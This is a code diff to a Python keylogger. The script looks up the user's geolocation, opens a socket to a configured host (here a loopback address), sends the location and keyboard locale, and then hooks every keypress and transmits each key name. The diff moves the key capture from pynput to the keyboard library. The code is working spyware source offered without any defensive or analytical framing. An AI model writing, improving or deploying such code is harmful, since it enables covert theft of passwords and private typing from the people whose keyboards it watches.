@@ -1,6 +1,7 @@
 import socket
 import geocoder
-from pynput.keyboard import Listener
+import keyboard
+import locale
 import time
 import threading
 CONN_HOST = "127.0.0.89"  # Standard loopback interface address (localhost)
@@ -23,17 +24,11 @@ def create_keylogger():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((CONN_HOST,CONN_PORT))
         s.send(bytes(USER_GEOLOCATION[24:-2], 'utf-8'))
+        time.sleep(0.5)
+        s.send(f'Keyboard: {locale.getdefaultlocale()[0]}'.encode('utf-8'))
         while True:
-            time.sleep(0.1)
-            def on_press(key):
-                string =f"{key}"
-                try:    s.send(bytes(string, 'utf-8'))
-                except: 
-                    print("\nServer keylogger is down.\n")
-                    time.sleep(5)
-                    
-            while True:
-                print("Starting logger.")
-                with Listener(on_press=on_press) as listener:
-                    listener.join()
-
+            try:
+                 keyboard.on_press(lambda e: s.send(f'Key: {e.name}'.encode("utf-8")))
+            except Exception as e:
+                 print(f"Keylogger Error: {e}")
+            keyboard.wait()
